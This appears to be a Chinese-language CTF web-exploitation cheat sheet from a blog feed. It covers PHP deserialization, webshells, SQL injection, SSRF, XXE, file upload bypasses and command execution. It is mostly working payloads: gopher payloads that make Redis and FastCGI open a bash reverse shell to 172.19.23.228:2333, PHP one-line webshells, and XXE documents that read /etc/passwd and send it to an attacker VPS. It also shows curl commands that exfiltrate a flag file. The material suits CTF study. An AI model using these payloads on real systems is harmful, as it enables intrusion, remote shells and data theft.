<p>__get  读取不可访问或不存在属性时被调用</p>
<p>__set 当给不可访问或不存在属性赋值时被调用</p>
<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p>
<p><strong>反序列化终点:</strong></p>
<p>__call  调用不可访问或不存在的方法时被调用</p>
<p>call_user_func php代码执行</p>
<p>call_user_func_array  php代码执行</p>
<p><strong>phar反序列化:</strong></p>
<p>phar://伪协议会在多个函数中反序列化其metadata部分</p>
<p>利用条件:</p>
<p>1.phar文件要能够上传到目标</p>
<p>2.文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">    //phar
    @unlink(&#34;phar6.0.phar&#34;)
    $phar = new Phar(&#34;phar6.0.phar&#34;); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&#34;GIF89a<span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span>&#34;); //设置stub
    $phar-&gt;setMetadata($obj); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); //添加要压缩的文件
    $phar-&gt;stopBuffering();//签名自动计算
</code></pre></td></tr></table>
</div>
</div><p>拓展与详情:</p>
<p>​	<a href="https://xz.aliyun.com/t/6057#toc-0">SUCTF 2019 出题笔记 &amp; phar 反序列化的一些拓展</a></p>
<p>​	<a href="https://xz.aliyun.com/t/2958">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></p>
<p><strong>关键要点：</strong></p>
<p>在Private 权限私有属性序列化的时候格式是 %00类名%00属性名，</p>
<p>在Protected 权限序列化的时候格式是 %00*%00属性名，</p>
<p>所以当serialize对象时 可用urlencode()进去url编码。</p>
<p><strong>一些tirck</strong></p>
<ul>
<li>
<p>绕过__wakeup方法:</p>
<p>​	当执行反序列化时 会先执行__wakeup()方法，一般会在此对反序列化字符串进行相关过滤，<strong>可将序列化字符串中代表变量个数的数字改为大于其真实值的数字进行绕过</strong>。</p>
</li>
<li>
<p>正则过滤类对象或者其它对象时:</p>
<p>​	可以在对象长度前添加<code>+</code>进行绕过，如<code>o:32</code> 改成 <code>o:+32</code></p>
</li>
<li>
<p>反序列化长度逃逸:</p>
<p>​	当执行反序列化时,根据序列化字符串中value的长度值来进行取值，且以<code>｝</code>结束，如果定义的长度大于value的真实长度往后面继续填充字符，直到满足长度，漏洞常见于对准备反序列化的字符串进行过滤处理，造成长度值不匹配，使属性值逃逸。</p>
<p>​	漏洞分析: <a href="https://xz.aliyun.com/t/6521">joomla3.4.6-RCE</a></p>
<p>​			传入的username包含\0\0\0,经过入库出库变成chr(0)*chr(0),每组长度为6变成了长度为3，属性中的字符串长度不匹配会向后填充，在password构造剩余字段长度和pop链，造成反序列化漏洞。</p>
<p>​	CTF: <a href="https://www.anquanke.com/post/id/200200#h2-3">i春秋2020新春公益赛babyphp</a></p>
<p>​			传入的序列化字符串经过safe方法处理过滤字符后，属性中的字符串长度值会比之前传入的大，如 * 替换成了 hacker ，1个字符长度变成了6个字符长度，造成后面的属性值逃逸。</p>
</li>
</ul>
<hr>
<h4 id="15-突破disable_functions">1.5 突破disable_functions</h4>
<p>​	这篇两篇文章已经说的很全了</p>
<p><a href="https://www.anquanke.com/post/id/197745#h3-11">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a></p>
<p><a href="https://www.anquanke.com/post/id/195686#h3-6">通过Antsword看绕过disable_functions</a></p>
<p>​	php7以上比较常用的  <a href="https://github.com/mm0r1/exploits">mm0r1/exploits</a></p>
<hr>
<h4 id="16-php一些函数">1.6 php一些函数</h4>
<p><code>move_uploaded_file()</code></p>
<p>​	函数进行上传.这个函数会递归删除文件最后的/.字符串(例如1.php/.会被转化为1.php)</p>
<p><code>create_function()</code></p>
<p>​	代码注射问题</p>
<pre><code>&lt;?php
$a = &quot;2;}phpinfo();/*&quot;;
$f = create_function('$b', $a);
</code></pre><p>​	相同的还有<code>assert()</code></p>
<pre><code>&lt;?php
$a = &quot;123') or phpinfo();/*&quot;;
$file = &quot;templates/&quot;.$a.&quot;.php&quot;;
assert(&quot;strpos('$file', '..') === false&quot;);
</code></pre><p><code>sprintf()</code></p>
<p>​	格式化字符串漏洞</p>
<p>​	占位符<code>%1$\</code> 、<code>%s</code> 、<code>%c</code>的使用 <a href="https://blog.csdn.net/weixin_41185953/article/details/80485075"><strong>深入解析sprintf格式化字符串漏洞</strong></a></p>
<p><code>filter_var()</code> 和<code>parse_url()</code></p>
<p>​	伪协议绕过filter_var <code>0://evil.com:80;baidu.com:80</code></p>
<p>​	将URL的部分变为变量绕过parse_url <code>0://evil$baidu.com</code></p>
<p>​	结合data://伪协议 + base64</p>
<p><a href="https://www.jianshu.com/p/80ce73919edb">【SSRF】如何绕过filter_var(), preg_match() 和 parse_url()</a></p>
<p><code>getimagesize()</code> 可以触发phar 反序列化</p>
<p><code>get_defined_functions()</code>这个函数是用于返回所有已定义函数的数组
<code>get_defined_vars() </code>这个函数是返回由所有已定义变量所组成的数组</p>
<p><code>$_SERVER['REQUEST_URI']</code>以及<code>$_REQUEST</code>会对特殊字符(<code>空格</code>、<code>.</code>、<code>[</code>)转换成为下划线_</p>
<hr>
<h4 id="17-php一句话">1.7 php一句话</h4>
<p><strong>绕过尖括号</strong></p>
<p>修改.htaccess或者.user.ini文件，为每个文件包含一个php伪协议</p>
<p><strong>绕过问号限制</strong></p>
<p>php小于7.0的可以通过</p>
<p><code>&lt;script language=&quot;PHP&quot;&gt;eval($_POST[A])&lt;/script&gt;</code></p>
<p><strong>绕过php标签限制</strong></p>
<p>短标签</p>
<p><code>&lt;?=eval($_POST[A]);?&gt;</code></p>
<p><strong>动态执行函数</strong></p>
<p><code>$_GET[1]($_GET[0]);</code></p>
<p><code>$_GET[1] ${$_GET[0]};</code></p>
<hr>
<h4 id="18-php代码执行getshell">1.8 php代码执行getshell</h4>
<p><a href="https://www.jianshu.com/p/9ae0c80751c4">CTF踩坑PHP编写一个不包含数字字母和下划线的后门</a></p>
<p>异或getshell</p>
<p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
<p><a href="https://xz.aliyun.com/t/5677">一道题回顾php异或webshell</a></p>
<p>取反getsehll</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">print(&#34;和&#34;.encode(&#39;utf8&#39;))
b&#39;\xe5\x92\x8c&#39;
print(&#34;和&#34;.encode(&#39;utf8&#39;)[2])
140
print(~&#34;和&#34;.encode(&#39;utf8&#39;)[2])
-141
</code></pre></td></tr></table>
</div>
</div><p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。
负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<hr>
<h2 id="2关键文件">2.关键文件</h2>
<h4 id="21-nginx">2.1 nginx</h4>
<p>​	nginx配置文件</p>
<pre><code>/usr/local/nginx/conf/nginx.conf
/etc/nginx/nginx.conf
</code></pre><p>​	nginx日志</p>
<pre><code>/var/log/nginx/access.log
/var/log/nginx/error.log
</code></pre><h4 id="22-apache">2.2 apache</h4>
<pre><code>/etc/apache2/sites-enabled/000-default.conf 查看默认根路径
/etc/apache2/apache2.conf    ubuntu下主配置文件

日志
/var/log/apache2/access.log
/var/log/apache2/error.log
</code></pre><h4 id="23-bash文件">2.3 bash文件</h4>
<pre><code>.bash_history 用户使用过的历史命令
.bashrc 用户定义别名和函数
.bash_profile  环境变量配置
.bash_logout 用户登出时执行的命令
</code></pre><h4 id="24-proc文件">2.4 proc文件</h4>
<p>linux 万物皆为文件，进程也不例外</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cmd" data-lang="cmd">/proc/self 链接到当前正在运行的进程

/proc/self/fd 打开文件的文件描述符

/proc/N/cwd 链接到进程当前工作目录

如果是通过小马执行的程序，那么当前进程就是apache，组合一下self/cwd:
proc/self/cwd/   apache的工作目录

proc/pid/cmdline   命令行信息

/proc/self/environ 环境变量信息
</code></pre></td></tr></table>
</div>
</div><p>CTF： <a href="https://blog.csdn.net/qq_38154820/article/details/103308985">2019高校运维赛misc2</a></p>
<h4 id="25-dev文件">2.5 dev文件</h4>
<p><code>/dev/fd</code> 是<code>/proc/self/fd</code>的软连接</p>
<hr>
<h2 id="3sql注入">3.SQL注入</h2>
<h4 id="31-mysql教程和文档">3.1 MYSQL教程和文档</h4>
<p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">Mysql教程 | 菜鸟教程</a></p>
<p><a href="https://dev.mysql.com/doc/">Mysql文档</a></p>
<hr>
<h4 id="32-实用好文">3.2 实用好文</h4>
<p>本来已经写了好几个标题，但写基础没意思，一些比较新奇的trick又需要些基础。直接记录大佬的文章好了。</p>
<p><a href="https://xz.aliyun.com/t/7169">对MYSQL注入相关内容及部分Trick的归类小结</a></p>
<p>PDO场景下的注入，一般就两种，一种是模拟预处理(默认开启)下堆叠注入造成的，这种情况下的注入要是有过滤，可以使用16进制进行绕过，用SET方法设置一个全局变量值,再用预编译执行这个全局变量。另一种就是宽字节注入造成单引号转义。</p>
<p><em><strong>当set被过滤</strong></em></p>
<p>上面提到的是用<code>SET @hpdoger</code>来设置变量，如果select没被过滤的话，还可以用<code>select @hpdoger:=0x12312</code>来设置变量，详情见：(<a href="https://blog.csdn.net/JesseYoung/article/details/40779631">https://blog.csdn.net/JesseYoung/article/details/40779631</a>)</p>
<p><em><strong>handler语句代替select查询</strong></em> (<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a>)</p>
<p>过滤了in、or 造成无法查询库，表名的情况。</p>
<p>没过滤in时</p>
<p><code>select table_name from mysql.innodb_table_stats where database_name=database();</code></p>
<p><code>sys系统库</code></p>
<blockquote>
<pre><code>#查询所有的库：
SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
#查询指定库的表（若无则说明此表从未被访问）：
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
</code></pre></blockquote>
<p>当库名查询到的时候，往往需要无列名注入，利用<code>union</code>来给未知列名“重命名”，或者<code>select</code>直接比较，<code>(select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {} limit 1)</code></p>
<p><code>CAST('0' as json) </code>二进制比较，区分大小写。<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">新春战疫公益赛-ezsqli-出题小记</a></p>
<p>UPDATE注入重复字段赋值,<code>UPDATE table_name set field1=new_value,field1=(select user()) [where]</code></p>
<p>还有一些盲注，比如order by后的比较盲注，like，regexp匹配，regexp不分大小写。</p>
<p>当比较常规的注入测试无果时，可以考虑下二次注入，约束攻击或者文件读/写，或许会有意想不到的收获。</p>
<p>然后就是各种时间注入，布尔注入的脚本编写，时常练习下二分法也是不错的。</p>
<hr>
<h2 id="4ssrf">4.SSRF</h2>
<h4 id="41-gopher的使用">4.1 gopher的使用</h4>
<p>先推文章</p>
<p><a href="https://yinwc.github.io/2018/07/31/Gopher/#%E6%94%BB%E5%87%BB-FastCGI">从一道CTF题看gopher协议的攻击面</a></p>
<p><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL">Gopher SSRF攻击内网应用复现</a></p>
<p>先用ssrf探测端口</p>
<p>攻击mysql，3306，利用条件:读取到mysql账号密码</p>
<p>结合<a href="https://github.com/undefinedd/extract0r-">工具</a>生成payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">ssrf_user</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;ssrf&#39;</span> <span class="o">-</span><span class="n">P</span> <span class="s1">&#39;SELECT * FROM ssrf.flag&#39;</span> <span class="o">-</span><span class="n">v</span>
</code></pre></td></tr></table>
</div>
</div><p>攻击Redis, 6379，利用条件:未授权访问</p>
<p><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></p>
<p>攻击FastCGI，9000</p>
<p><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</code></p>
<p>其他Vulnerablility web</p>
<pre><code>POST /exp.php HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

e=bash -i &gt;%26 /dev/tcp/172.19.23.228/2333 0&gt;%261
</code></pre><pre><code>gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null
</code></pre><hr>
<h4 id="42-ip地址绕过与白名单">4.2 IP地址绕过与白名单</h4>
<p>进制:</p>
<pre><code>数字地址(十进制)：127.0.0.1-&gt;2130706433
十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01
八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01
省略写法：127.0.0.1-&gt;127.1
</code></pre><p>利用xio.io:</p>
<pre><code>127.0.0.1.xip.io
www.127.0.0.1.xip.io
xxx.127.0.0.1.xip.io
fuzz.xxx.127.0.0.1.xip.io
</code></pre><p>用IPV6绕过：</p>
<pre><code>http://[::ffff:127.0.0.1]/
http://[::1]/
</code></pre><p>绕过内网ip过滤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$hostname=$url_parse[&#39;host&#39;]; 
$ip=gethostbyname($hostname); 
$int_ip=ip2long($ip);
return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; 
</code></pre></td></tr></table>
</div>
</div><pre><code>1. http://0.0.0.0/flag.php   0.0.0.0掩码绕过
2. http://foo@127.0.0.1:80@baidu.com/flag.php  白名单是baidu.com，黑名单是127x网段
3. http://%5B::%5D:22/ 绕过主机名探测，用[::]替代127.0.0.1
4. data://baidu.com/plain;base64,xxxxxx  data://协议，php不关心MIME类型，所以可以把baidu.com放到MIME类型里
5. file:///proc/self/cwd/index.php  file://协议+ proc进程读取 proc/net/arp arp表
</code></pre><hr>
<h4 id="43-unicode编码绕过">4.3 unicode编码绕过</h4>
<pre><code>LocalHost = localhost = ⓛocaⓛhost 
</code></pre><hr>
<h2 id="5xxe">5.XXE</h2>
<h4 id="51-常用poc">5.1 常用poc</h4>
<p>外部实体:</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;
</code></pre><p>参数实体:</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY %xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %xxe;
]&gt;
</code></pre><p>两层嵌参数实体：几乎所有XML解析器能够发现如下这种两层嵌套式的</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myip/?%file;'&gt;&quot;&gt;
    %start;
    %send;
]&gt;
&lt;message&gt;10&lt;/message&gt;
</code></pre><p>三层嵌套参数实体:无需引用外部dtd也可以实现Blind XXE</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ELEMENT message ANY&gt;
    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;
    &lt;!ENTITY % para '
        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;para2;
    '&gt;
    %para;
]&gt;
&lt;message&gt;10&lt;/message&gt;
</code></pre><p>utf-7:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot;?&gt;
+ADwAIQ-DOCTYPE ANY +AFs-
    +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
+AF0APg-
+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-
EOD;
</code></pre><p>xinclude:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
 &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;
&lt;/root&gt;
</code></pre><p>xslt:</p>
<p><a href="https://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9"> 从sql注入到xslt再到xxe的一道ctf题目</a></p>
<p>文章:</p>
<p><a href="https://xz.aliyun.com/t/6829#toc-4">PHP与JAVA之XXE漏洞详解与审计</a></p>
<p><a href="https://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/">浅析xml之xinclude &amp; xslt</a></p>
<hr>
<h4 id="52-一些协议">5.2 一些协议</h4>
<p>php:</p>
<p><code>php://filter/read=convert.base64-encode/resource=file://flag.php</code></p>
<p><code>php://filter/read=convert.base64-encode/resource=phar://xxx.jpg</code></p>
<p>java:</p>
<p><code>netdoc://flag.php</code></p>
<p>file、netdoc 不仅可以读文件内容，还可以读目录。</p>
<hr>
<h4 id="53-oob读取文件">5.3 OOB读取文件</h4>
<p>vps上部署DTD文件,eval.dtd</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///ect/passwd&quot;&gt;

&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM 'http://your_vps/?file=%file;'&gt;&quot;&gt;
</code></pre><p>POST:</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % send SYSTEM 'http://vps/eval.dtd'&gt;

%send;
%test;
%back;
]&gt;
</code></pre><hr>
<h4 id="54-本地xxe">5.4 本地xxe</h4>
<p>dtd-1:</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
    &lt;!ENTITY % ISOamso '
        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;eval;
        &amp;#x25;send;
    '&gt; 
    %remote;
]&gt;
</code></pre><p>javaweb 的本地xxe</p>
<pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE message [
    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;

    &lt;!ENTITY % expr 'aaa)&gt;
        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///FILE_TO_READ&quot;&gt;
        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;eval;
        &amp;#x25;error;
        &lt;!ELEMENT aa (bb'&gt;

    %local_dtd;
]&gt;
&lt;message&gt;&lt;/message&gt;
</code></pre><p><a href="https://xz.aliyun.com/t/5503">https://xz.aliyun.com/t/5503</a></p>
<p><a href="https://www.jishuwen.com/d/2EGU">https://www.jishuwen.com/d/2EGU</a></p>
<hr>
<h2 id="6文件上传">6.文件上传</h2>
<h4 id="61-fuzz思路">6.1 fuzz思路</h4>
<p>1.content-type 检测，改图片后缀</p>
<p>2.检测文件头，使用<code>getimagesize()</code>函数来获取文件的MIME类型</p>
<pre><code>gif(GIF89a) : 47 49 46 38 39 61
jpg、jpeg : FF D8 FF
png : 89 50 4E 47 0D 0A
</code></pre><p>3.黑名单检测</p>
<pre><code>大小写判断 （如将php改为pHp等）
特殊扩展名来绕过（如php可以使用php3、php4、php5等来代替）
</code></pre><p>4.白名单检测</p>
<pre><code>使用%00截断文件名来上传（后面会讲）
如果目标还存在文件包含漏洞，那么就可以上传图片马再文件包含来拿shell
</code></pre><p>5.图片二次渲染</p>
<p><a href="https://secgeek.net/bookfresh-vulnerability/">BookFresh Tricky File Upload Bypass to RCE</a>](<a href="https://secgeek.net/bookfresh-vulnerability/">https://secgeek.net/bookfresh-vulnerability/</a>)</p>
<p>6.解析漏洞</p>
<p>Apache</p>
<pre><code>a.php.xxx
CVE-2017-15715 a.php\x0A
</code></pre><p>7.%00 截断</p>
<pre><code>PHP &lt; 5.3.4
magic_quotes_gpc 关闭
</code></pre><p>8.多文件上传</p>
<p>文章:</p>
<p><a href="https://xz.aliyun.com/t/6047#toc-1">浅谈常见的文件上传的检测方式与绕过方法</a></p>
<hr>
<h4 id="62-htaccess和userini">6.2 htaccess和.user.ini</h4>
<p>1.htaccess</p>
<p>apache中的.htaccess</p>
<p>将同目录下的jpg解析为php,文件内容如下</p>
<pre><code>AddType application/x-httpd-php .jpg
</code></pre><p><a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">PHP htaccess injection cheat sheet</a></p>
<p>2..user.ini</p>
<p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。</p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门</a></p>
<p>当一个文件夹下有php</p>
<pre><code>php_value auto_prepend_file = f13g.php
</code></pre><hr>
<h4 id="62-php写文件">6.2 php/.写文件</h4>
<p>后缀给<code>php/.</code>，在函数操作的时候也可以存为php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">copy()、file_get_contents()、move_uploaded_file()
</code></pre></td></tr></table>
</div>
</div><hr>
<h2 id="7命令执行">7.命令执行</h2>
<h4 id="71-bash下的trick">7.1 bash下的trick</h4>
<p><a href="https://ajatars.github.io/posts/%E5%90%84%E7%A7%8D%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">放下菜鸡的文章</a></p>
<p>其他一些:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">base64
:~# <span class="nb">echo</span> <span class="s1">&#39;whoami&#39;</span> <span class="p">|</span> base64
:~# <span class="nb">echo</span> <span class="s1">&#39;d2hvYW1pcg==&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> bash
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">:~# ca<span class="se">\t</span> /f<span class="se">\l</span>ag
</code></pre></td></tr></table>
</div>
</div><hr>
<h4 id="72-巧用curl">7.2 巧用curl</h4>
<p>用Curl外带到自己的vps</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">curl vps -X POST -d <span class="sb">`</span>cat /flag<span class="sb">`</span>
curl -T ./flag vps
</code></pre></td></tr></table>
</div>
</div>]]></description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://ajatars.github.io/categories/ctf/">CTF</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://ajatars.github.io/tags/ctf/">CTF</category>
                                
                            
                        
                    
                
            </item>
        
    </channel>
</rss>
